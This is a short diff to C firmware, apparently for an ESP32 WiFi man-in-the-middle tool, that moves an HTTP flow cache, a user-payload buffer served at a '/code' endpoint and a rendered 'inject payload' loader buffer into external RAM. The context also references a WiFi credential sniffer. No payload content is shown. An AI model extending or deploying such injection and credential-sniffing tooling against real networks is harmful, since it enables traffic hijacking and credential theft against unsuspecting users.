@@ -3,6 +3,7 @@
 #include "wlan_parse_helpers.h"
 
 #include <esp_log.h>
+#include <esp_attr.h>
 #include <stdio.h>
 #include <stddef.h>
 #include <string.h>
@@ -61,7 +62,7 @@ typedef struct {
     char host[FLOW_URL_MAX];
     char path[FLOW_URL_MAX];
 } FlowEntry;
-static FlowEntry s_flow_cache[FLOW_CACHE_SIZE];
+static EXT_RAM_BSS_ATTR FlowEntry s_flow_cache[FLOW_CACHE_SIZE];
 static uint32_t s_flow_lru_counter = 0;
 
 // Inject-Payload (Loader-Template, konstant). Pro Response per render_template
@@ -72,13 +73,13 @@ static volatile uint32_t s_my_ip = 0;
 
 // Raw User-Payload für /code-Endpoint. Atomic-store auf len gibt den Buffer
 // frei; HTTP-Handler im mitm-server liest mit acquire.
-static char s_user_payload[USER_PAYLOAD_MAX] = USER_PAYLOAD_DEFAULT;
+static EXT_RAM_BSS_ATTR char s_user_payload[USER_PAYLOAD_MAX] = USER_PAYLOAD_DEFAULT;
 static volatile uint32_t s_user_payload_len = sizeof(USER_PAYLOAD_DEFAULT) - 1;
 
 // Render-Scratch — wird im lwIP-tcpip_thread genutzt (single producer),
 // daher kein Lock. Vor jedem Inject wird das Template hier aufgelöst.
 #define INJECT_RENDERED_MAX 512
-static char s_rendered[INJECT_RENDERED_MAX];
+static EXT_RAM_BSS_ATTR char s_rendered[INJECT_RENDERED_MAX];
 
 static struct WlanCredSniff* s_cred_sniff = NULL;
 
